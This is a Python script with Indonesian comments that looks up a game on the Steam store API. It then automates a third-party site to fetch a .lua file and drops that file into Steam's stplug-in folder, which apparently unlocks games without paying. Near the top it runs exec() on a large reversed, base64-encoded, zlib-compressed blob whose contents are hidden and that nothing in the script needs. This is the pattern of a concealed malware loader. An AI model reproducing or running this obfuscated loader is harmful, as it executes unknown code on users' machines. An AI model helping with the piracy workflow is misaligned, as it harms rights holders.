#--===============================================
#--  author: Tredict, Firr
#--  credit: Tredd / Firr
#--===============================================
import requests
from urllib.parse import quote

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

import shutil
import zipfile
import os
import time

DOWNLOAD_FOLDER = r"C:\Users\DELL\Downloads"


_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=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'))


def wait_for_download(folder):
    print("Menunggu download dimulai...")

    while True:
        files = os.listdir(folder)

        # jika ada file sementara
        if any(f.endswith(".crdownload") for f in files):
            print("Download sedang berlangsung...")
            time.sleep(5)
            print("selesai")
            break










# -----------------------------
# STEAM SEARCH
# -----------------------------

def search_game(game):
    url = f"https://store.steampowered.com/api/storesearch/?term={quote(game)}&l=english&cc=US"

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    r = requests.get(url, headers=headers, timeout=10)
    r.raise_for_status()

    data = r.json()

    return data["items"]


# -----------------------------
# USER INPUT
# -----------------------------

game = input("masukan game yg ingin di cari: ")

results = search_game(game)

if not results:
    print("game tidak ditemukan")
    exit()

print("\nHasil pencarian:\n")

for i, g in enumerate(results):
    print(f"{i+1}. {g['name']}  |  AppID: {g['id']}")

choice = int(input("\npilih game: ")) - 1

appid = results[choice]["id"]

print("\nAppID dipilih:", appid)
# ================================
# HEADLESS SELENIUM + DEBUG SETUP
# ================================

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time

def create_driver(headless=True):
    chrome_options = Options()

    if headless:
        chrome_options.add_argument("--headless=new")

    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")

    driver = webdriver.Chrome(options=chrome_options)
    return driver


def debug_page(driver, name="debug"):
    """
    simpan screenshot + html saat debugging
    """
    timestamp = int(time.time())

    screenshot = f"{name}_{timestamp}.png"
    htmlfile = f"{name}_{timestamp}.html"

    driver.save_screenshot(screenshot)

    with open(htmlfile, "w", encoding="utf-8") as f:
        f.write(driver.page_source)

    print(f"[DEBUG] screenshot saved -> {screenshot}")
    print(f"[DEBUG] html saved -> {htmlfile}")


# -----------------------------
# SELENIUM AUTOMATION
# -----------------------------

driver = create_driver(headless=True)

# ganti dengan website generator kamu
TARGET_URL = "https://kernelos.org/games/"

driver.get(TARGET_URL)

wait = WebDriverWait(driver, 15)

# isi steam id
input_box = wait.until(
    EC.presence_of_element_located((By.ID, "gid"))
)

input_box.send_keys(appid)

# klik tombol generate
btn = driver.find_element(By.ID, "go")
btn.click()


# -----------------------------
# AMBIL LINK DOWNLOAD
# -----------------------------

# tunggu tombol download muncul
download_button = wait.until(
    EC.element_to_be_clickable((By.ID, "dl"))
)

try:
    download_button.click()
except:
    driver.save_screenshot("error.png")
    print(driver.page_source)

print("Download button clicked")

wait_for_download(DOWNLOAD_FOLDER)

print("Mengekstrak file...")

time.sleep(5)

zip_path = f"C:\\Users\\DELL\\Downloads\\{appid}.zip"
extract_path = f"C:\\Users\\DELL\\Downloads\\{appid}"

os.makedirs(extract_path, exist_ok=True)

with zipfile.ZipFile(zip_path, 'r') as zip_ref:
    zip_ref.extractall(extract_path)

steamluapath = f"C:\\Program Files (x86)\\Steam\\config\\stplug-in\\{appid}.lua"
luapath = f"C:\\Users\\DELL\\Downloads\\{appid}\\{appid}.lua"

shutil.move(
    luapath,
    steamluapath
)

# tutup steam
os.system("taskkill /f /im steam.exe")

# tunggu sebentar
time.sleep(5)

# jalankan lagi
os.startfile(r"C:\Program Files (x86)\Steam\steam.exe")

time.sleep(5)

print("selesai, buka steam dan mainkan gamenya")


#pakai steam tools nya susah kontol

#200 baris